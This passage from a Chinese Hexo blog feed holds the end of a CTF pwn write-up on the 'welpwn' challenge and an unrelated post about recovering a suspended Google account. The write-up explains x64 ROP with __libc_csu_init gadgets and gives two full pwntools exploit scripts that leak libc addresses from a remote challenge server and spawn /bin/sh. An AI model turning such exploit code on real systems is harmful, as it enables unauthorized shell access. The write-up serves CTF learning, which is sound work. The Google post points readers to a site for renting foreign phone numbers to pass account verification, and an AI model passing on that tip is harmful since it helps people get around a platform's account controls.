alt=""></p><pre><code>ida查看echo函数的结束地址之后就是read(&amp;buf)的地址。又因为echo开辟的空间是0x20，故echo开始处跳0x20个字节即能到buf处。buf上有0x400大小可以布置ROP。一次rop是8字节，找一个gadget执行四次pop即可。</code></pre><h3 id="0x03-选择合适的gadgets"><a href="#0x03-选择合适的gadgets" class="headerlink" title="0x03.选择合适的gadgets"></a>0x03.选择合适的gadgets</h3><p><img src="https://img-blog.csdnimg.cn/2020032019213157.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><pre class="line-numbers language-yaml"><code class="language-yaml">pop4_addr=0x40089c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x04-万能的通用gadgets"><a href="#0x04-万能的通用gadgets" class="headerlink" title="0x04.万能的通用gadgets"></a>0x04.万能的通用gadgets</h3><blockquote><p>剩下的ROP链可以用通用gadgets来实现。<br>这里涉及到X64下面的一些万能gadgets，原因在于__libc_csu_init()函数。<br>一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p></blockquote><p><strong>汇编代码如下：</strong></p><pre><code>  400606:   48 8b 5c 24 08          mov    0x8(%rsp),%rbx  40060b:   48 8b 6c 24 10          mov    0x10(%rsp),%rbp  400610:   4c 8b 64 24 18          mov    0x18(%rsp),%r12  400615:   4c 8b 6c 24 20          mov    0x20(%rsp),%r13  40061a:   4c 8b 74 24 28          mov    0x28(%rsp),%r14  40061f:   4c 8b 7c 24 30          mov    0x30(%rsp),%r15</code></pre><pre><code>  4005f0:   4c 89 fa                mov    %r15,%rdx  4005f3:   4c 89 f6                mov    %r14,%rsi  4005f6:   44 89 ef                mov    %r13d,%edi  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)</code></pre><blockquote><p>我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx<em>8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx</em>8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p></blockquote><p><strong>call system(“/bin/sh”)</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!bash</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#system(rdi = bss_addr+8 = "/bin/sh")</span>payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>参考blog：</strong><a href="http://www.vuln.cn/6644" target="_blank" rel="noopener">蒸米-一步一步学ROP之x64</a><br><strong>实例运用：</strong><a href="https://blog.csdn.net/weixin_43092232/article/details/104906434" target="_blank" rel="noopener">64位程序rop链构造</a></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="使用DynELF"><a href="#使用DynELF" class="headerlink" title="使用DynELF"></a>使用DynELF</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -.- coding=UTF-8 -.-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">48359</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>pop4_addr <span class="token operator">=</span> <span class="token number">0x40089c</span> <span class="token comment" spellcheck="true">#跳过echo</span>pop6_addr <span class="token operator">=</span> <span class="token number">0x40089a</span> <span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15;ret;</span>rop2_addr <span class="token operator">=</span> <span class="token number">0x400880</span> <span class="token comment" spellcheck="true">#mov rdx,r15;mov rdi,r14;mov edi,r13;</span>start_addr <span class="token operator">=</span> <span class="token number">0x400630</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x4008a3</span> <span class="token comment" spellcheck="true">#pop rdi;ret</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#先接收一次</span>    payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true">#junk</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过write函数泄露 pop r14,r15;</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#write(1,address,8)</span>    payload <span class="token operator">+=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#start调整栈帧</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#回到main函数</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%# x => %s "</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token punctuation">(</span>data <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> datadyn <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> dyn<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#写入/bin/sh</span>payload1 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#read(0,bss_addr,8)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span> payload1 <span class="token operator">+=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 执行system<span class="token punctuation">(</span><span class="token string">'bss_addr'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> payload1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#把'/bin/sh'写到bss_addr</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用LibcSearcher"><a href="#使用LibcSearcher" class="headerlink" title="使用LibcSearcher"></a>使用LibcSearcher</h3><p><strong>使用write_addr-libc.dump(‘write’)计算出libc_off地址<br>再由libc_off+libc.dump(‘system’)计算出system_addr</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -.-coding=UTF-8 -.-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">48359</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>pop4_addr <span class="token operator">=</span> <span class="token number">0x40089c</span>pop6_addr <span class="token operator">=</span> <span class="token number">0x40089a</span>rop2_addr <span class="token operator">=</span> <span class="token number">0x400880</span>start_addr <span class="token operator">=</span> <span class="token number">0x400630</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>puts_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#bss_addr = elf.bss()</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x4008a3</span> <span class="token comment" spellcheck="true">#pop rdi;ret</span>main_addr <span class="token operator">=</span> <span class="token number">0x4007CD</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算libc_off</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过write函数来泄露write_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用start函数调整栈帧</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info <span class="token punctuation">(</span><span class="token string">"write_addr => %#x"</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>libc_off<span class="token operator">=</span>write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算libc的偏移</span>sys_addr <span class="token operator">=</span> libc_off <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算system地址</span>binsh_addr <span class="token operator">=</span> libc_off <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算'/bin/sh'地址</span>payload1 <span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>payload1 <span class="token operator">=</span> payload1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：<br>使用LibcSearcher方式，python要安装了相对应模块，还需要下载对应的libc版本。<strong>我第二种方法只是给了一个模板，未使用此方法getshell。</strong><br><strong>参考博客：</strong><a href="https://blog.csdn.net/weixin_43092232/article/details/104996280" target="_blank" rel="noopener">Ubuntu下LibcSearcher的安装和使用方法</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google账号活动异常怎么办？|试了好多办法终于解决</title>
      <link href="/2020/03/21/google/"/>
      <url>/2020/03/21/google/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我在copySDN上的帖子竟然被删了…给的理由是翻墙，wok…<br>突然发现可以直接导出md再传到自己的blog上哈哈哈！<br>说到google账户，我想不少人用google的时候都是以访客身份登录的。<br>但是，一个google账户有些时候还是很有用的，比如在YouTube上面下载视频（某次比赛就用到了），或者你看某些需要确认你年龄的视频（手动狗头）！！总而言之，你会忍不住想要注册一个账号！！！<br>当然，现在注册账号国内手机号不一定可以了，反正我当初的时候还可以…但是由于登录地点经常不同（为啥？自己想），被检测到就会被封号！！<br><strong>敲黑板！！！</strong><br><strong>现在还没被封的赶紧去开两步验证！</strong></p><hr><p>下面开始我的悲惨故事：<br>终于有一天，google查到了我的头上，在我还不知道有封号这会事之前，给我把账号冻结了。冻结了就冻结了吧，反正我绑了邮箱（<strong>当初没有绑定手机号！！！切记赶紧去绑！！</strong>），我就登邮箱啊，结果一切都验证完之后，它会跳出来一个这个界面：<br><img src="https://img-blog.csdnimg.cn/20200224212525221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>这个我再填自己手机号就报错了，无法验证，一开始我还以为是我手机号的问题，我试了好多其他的都不行（我还用香港的手机号试了都不行….）绝望.jpg！<br>而且这时候，我再去注册一个google号，发现也注册不了了！绝望.GIF！</p><hr><h1 id="我是怎么解决的？"><a href="#我是怎么解决的？" class="headerlink" title="我是怎么解决的？"></a>我是怎么解决的？</h1><p>下面是我逛遍某乎、某宝、某度、v2ex、google…的经历</p><h2 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h2><p><a href="https://www.zhihu.com/question/39866455" target="_blank" rel="noopener">某乎链接</a><br><strong>选择尝试其他问题</strong><br><img src="https://img-blog.csdnimg.cn/20200224213245757.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>2016年的老贴，反正我按他说的做没成功…</p><h2 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h2><p><img src="https://img-blog.csdnimg.cn/20200224213504469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>买手机号，反正我是没有尝试去买，但我试过香港的手机号，一样不能用于验证。</p><h2 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h2><p><a href="https://v2ex.com/t/292377" target="_blank" rel="noopener">v2ex上的贴子</a><br><img src="https://img-blog.csdnimg.cn/20200224214022949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>给google发邮件，知乎上也有人提到了这种方法。<br>附上他们给的邮箱地址：<a href="mailto:accounts-support@google.com">accounts-support@google.com</a><br>这种方法我试了最久，发了第五封邮件的时候终于回我了。<br><img src="https://img-blog.csdnimg.cn/2020022421424795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>我第一眼还以为给了我个验证的链接！看到no-reply我心就凉了…<br>咋地？？几年过去这个账号被弃用了？？（我有理由怀疑是我被拉黑了…我前面几天发的就回了这一封，但是回了这一封之后我再发就是秒回了！！！）<br>邮箱也不行，我吐了！</p><h2 id="Part4"><a href="#Part4" class="headerlink" title="Part4"></a>Part4</h2><p>最后，我用了最直接的方法解决了这个问题。找了个在英国的熟人，用他手机号接收了验证码。结果如下：<br><img src="https://img-blog.csdnimg.cn/20200224214737603.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>又考虑到这个方法不太具有普适性，所以我附了一个可以租用外国电话号码的网址，<a href="https://www.smspva.com/" target="_blank" rel="noopener">点击此处</a></p><p><strong>最后祝大家都能成功解决问题！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Google </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -疑难杂症 -Google账号 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
